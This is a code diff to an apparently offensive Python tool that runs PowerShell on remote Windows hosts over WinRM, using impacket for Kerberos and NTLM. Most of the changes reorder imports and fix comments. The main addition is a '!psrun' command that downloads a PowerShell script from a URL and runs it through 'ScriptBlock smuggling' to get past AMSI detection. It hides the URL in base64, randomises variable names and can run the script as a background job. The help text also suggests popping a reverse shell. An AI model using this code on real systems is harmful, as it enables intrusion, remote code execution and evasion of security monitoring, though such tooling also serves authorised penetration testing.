@@ -5,30 +5,28 @@ from copy import deepcopy
 from base64 import b64encode, b64decode
 from struct import pack, unpack, error
 from signal import SIGINT, signal, getsignal
-from random import randbytes, getrandbits
+from random import randbytes, randint
 from pathlib import PureWindowsPath, Path
 from argparse import ArgumentParser
 
-from urllib.parse import urlparse
+# pip install xmltodict
+import xmltodict
+
+# pip install requests
+from requests import Session
+
 from urllib3 import disable_warnings
 from urllib3.util import SKIP_HEADER
+from urllib.parse import urlparse
 from urllib3.exceptions import InsecureRequestWarning
 
 disable_warnings(category=InsecureRequestWarning)
-
-import xmltodict                          # pip install xmltodict
-
-from requests import Session              # pip install requests
-
-from Cryptodome.Hash import HMAC, MD5, SHA256
-from Cryptodome.Cipher import ARC4
-
 
 # -- impacket: ------------------------------------------------------------------------------------
 from pyasn1.codec.ber import encoder, decoder
 from pyasn1.type.univ import ObjectIdentifier, noValue
 
-from impacket.krb5.asn1 import AP_REQ, AP_REP, TGS_REQ, TGS_REP, AS_REP, seq_set
+from impacket.krb5.asn1 import AP_REQ, AP_REP, TGS_REP, seq_set
 from impacket.krb5.asn1 import Authenticator, EncAPRepPart
 
 from impacket.ntlm import getNTLMSSPType1, getNTLMSSPType3, SEALKEY, SIGNKEY, SEAL, SIGN
@@ -47,6 +45,9 @@ from impacket.krb5.gssapi import GSS_C_CONF_FLAG, GSS_C_INTEG_FLAG
 from impacket import version
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
+
+from Cryptodome.Hash import HMAC, MD5, SHA256
+from Cryptodome.Cipher import ARC4
 
 # -- helpers and constants: -----------------------------------------------------------------------
 def between(buf, pre, suf):
@@ -93,7 +94,7 @@ def split_args(cmdline):
 
 def utfstr(s):
     # chars inside xml strings that have non-printable characters are encoded like this, eg:
-    # '\n' would be "_x000A_", etc.. although if i don't know how to tell if a charcter was
+    # '\n' would be "_x000A_", etc.. although i don't know how to tell if a charcter was
     # encoded during xml serialization or there was a literal *string* "_x000A_" somewhere
     # to begin with:
     return re.sub(r'_x([0-9a-fA-F]{4})_', lambda m: chr(int(m.group(1), 16)), s).rstrip()
@@ -785,7 +786,7 @@ class Runspace:
             rsp = self._receive(command_id)
             if "fault" in rsp:
                 if rsp["subcode"] == "w:TimedOut":
-                    timeouts += 1                  # some commands take while; this is fine, but
+                    timeouts += 1                  # some commands take a while; this is fine, but
                     yield { "timeout" : timeouts } # yield anyway, maybe user wants to interrupt
                     continue
                 else:
@@ -809,7 +810,7 @@ class Runspace:
                             yield { "info" : utfstr(rec.get("ToString") or "unknown info") }
                             break
 
-                elif msg_type == PIPELINE_STATE: # treat this as error:
+                elif msg_type == PIPELINE_STATE: # find if there was an exception and treat it as error:
                     err = msg.get("Obj", {}).get("MS", {}).get("Obj", {})
                     if err.get("@N") == "ExceptionAsErrorRecord":
                         yield { "error" : utfstr(err.get("ToString") or "uknonwn exception") }
@@ -822,9 +823,7 @@ class Runspace:
                     logging.debug(f"{msg_ids[msg_type]} : {msg}")
 
             if rsp["state"]:
-                # this sends CommandState/Done when pipeline finishes (normally, with
-                # error of after sending ctrl_c)
-                break
+                break # == CommandState/Done when pipeline finishes
 
         self.current_command_id = None
 
@@ -944,7 +943,7 @@ class Shell:
             __history = FileHistory(".winrmexec_prompt_toolkit_history")
             self.prompt = lambda s: prompt(ANSI(s), history=__history, enable_history_search=True)
         except ModuleNotFoundError:
-            logging.info("'prompt_toolkit' not installed, using built-in 'readline'")
+            logging.warning("'prompt_toolkit' not installed, using built-in 'readline'")
             import readline, atexit
             histfile = ".winrmexec_readline_history"
             try:
@@ -971,14 +970,21 @@ class Shell:
     def help(self):
         print()
         print("Ctrl+D to exit, Ctrl+C will try to interrupt running pipeline gracefully")
-        print("\x1b[1m\x1b[31mThis is not an interactive shell!\x1b[0m If you need to run programs that expect inputs")
-        print("from stdin, or exploits that spawn cmd.exe, etc., pop your favorite revshell")
+        print("\x1b[1m\x1b[31mThis is not an interactive shell!\x1b[0m If you need to run programs that expect")
+        print("inputs from stdin, or exploits that spawn cmd.exe, etc., pop your favorite revshell")
         print()
         print("Special !bangs:")
-        print("  !download RPATH [LPATH] # downloads a file or directory (as a zip file); use "\
-              "'PATH' if it contains whitespace")
+        print("  !download RPATH [LPATH] # downloads a file or directory (as a zip file); use 'PATH'")
+        print("                          # if it contains whitespace")
+        print()
         print("  !upload LPATH [RPATH]   # uploads a file; use 'PATH' if it contains whitespace,")
         print("                          # though use iwr if you can reach your ip from the box")
+        print()
+        print("  !psrun [-bg] URL        # run .ps1 script from url; if -bg is specified this will run it")
+        print("                          # as a background job (no output); uses ScriptBlock smuggling, so")
+        print("                          # no amsi patching is needed unless that script tries to load ")
+        print("                          # .NET assembly")
+        print()
         print("  !log                    # start logging output to winrmexec_[timestamp]_stdout.log")
         print("  !stoplog                # stop logging output to winrmexec_[timestamp]_stdout.log")
         print()
@@ -997,6 +1003,8 @@ class Shell:
                     self.upload(runspace, cmd.removeprefix("!upload "))
                 elif cmd.startswith("!log"):
                     self.start_log()
+                elif cmd.startswith("!psrun "):
+                   self.psrun(runspace, cmd.removeprefix("!psrun "))
                 elif cmd.startswith("!stop_log"):
                     self.stop_log()
                 elif cmd.startswith("!") or cmd in { "help", "?" }:
@@ -1090,6 +1098,40 @@ class Shell:
                     runspace.interrupt()
 
         return h.interrupted > 0
+
+    def psrun(self, runspace, cmdline):
+        args = split_args(cmdline)
+        if len(args) == 0:
+            return
+
+        if len(args) == 2 and args[0] == "-bg":
+            background = True
+            url = args[1]
+        else:
+            background = False
+            url = args[0]
+
+        url = b64str(url.strip())
+        var_c = "c" + randbytes(randint(4,12)).hex()
+        var_a = "a" + randbytes(randint(4,12)).hex()
+        var_b = "b" + randbytes(randint(4,12)).hex()
+
+        commands = [
+            f'${var_c} = [ScriptBlock]::Create((New-Object Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{url}")))).Ast',
+            f"${var_c} = ${var_c}.EndBlock.Copy()",
+            f"${var_a} = [ScriptBlock]::Create('').Ast",
+            f"${var_b} = [System.Management.Automation.Language.ScriptBlockAst]::new(${var_a}.Extent, $null, $null, $null, ${var_c}, $null)",
+            f"Remove-Variable @('{var_c}', '{var_a}')",
+            f"Invoke-Command -ScriptBlock ${var_b}.GetScriptBlock()"
+        ]
+
+        if background:
+            op = "Invoke-Expression $([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)))"
+            cmdb64 = commands = "@(" + ",".join("'" + b64str(c) + "'" for c in commands) + ")"
+            commands = [f"Start-Job -ScriptBlock {{ {cmdb64} | foreach {{ {op} }} }}"]
+
+        for ps in commands:
+            self.run_with_interrupt(runspace, ps, self.fancy_output)
 
     def upload(self, runspace, cmdline):
         args = split_args(cmdline)[:2]
